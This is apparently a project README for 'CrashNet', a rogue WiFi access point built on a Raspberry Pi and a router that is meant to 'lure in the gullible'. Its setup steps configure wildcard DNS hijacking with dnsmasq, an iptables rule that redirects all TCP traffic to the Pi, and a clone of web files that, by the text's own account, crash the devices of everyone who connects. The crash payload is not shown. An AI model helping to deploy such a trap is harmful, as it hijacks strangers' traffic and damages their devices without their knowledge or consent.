CrashNet
========

This is a wireless AP that is designed to lure in the gullible.

To setup your own crashnet you will need the following:

* Raspberry Pi
* WiFi router
* Some way of getting to the rPi when its not plugged in, (HDMI / TV / Serial Console)

If you are looking for a router to do this on rather then re using a router you already have, look for a "cable broadband" router.

This way you will get a "Internet" port on the router that you will use to plug the raspberry Pi into.

On the raspberry pi you will need to install

`apt-get install dnsmasq lighttpd git`

Then we need to get the web files that will be used.

**This will remove everything in your /var/www/**
```
rm /var/www/*
git clone https://github.com/benjojo/CrashNet.git /var/www/
```

After you have done that. Disconnect your Pi from the internet in your house and fall back to your alternative input (TV etc)

Then you will need to edit the file (Using the editor of you choosing I prefer `nano`)
`/etc/dnsmasq/dnsmasq.conf`

```
# ...
interface=eth0
# ...
dhcp-range=10.1.0.50,10.1.0.200,12h
# ...
address=/#/10.1.0.1
# ...
```

To apply your changes you will need to execute 
`/etc/init.d/dnsmasq start`

**WARNING DO NOT RUN THIS WHEN IT IS CONNECTED INTO YOUR LOCAL NETWORK**

Then run 
`iptables -t nat -A PREROUTING -s 10.1.0.1/24 -p tcp -j DNAT --to-destination 10.1.0.1`

to redirect all traffic to the Pi no matter what.

Then set the IP address of the Pi to the one we are now redirecting to using `ifconfig eth0 10.1.0.1`

At this point you can plug in your Pi into the router and power the router on to setup the routers settings like SSID.

At this point it should be redirecting ( and crashing ) everyone who joins!
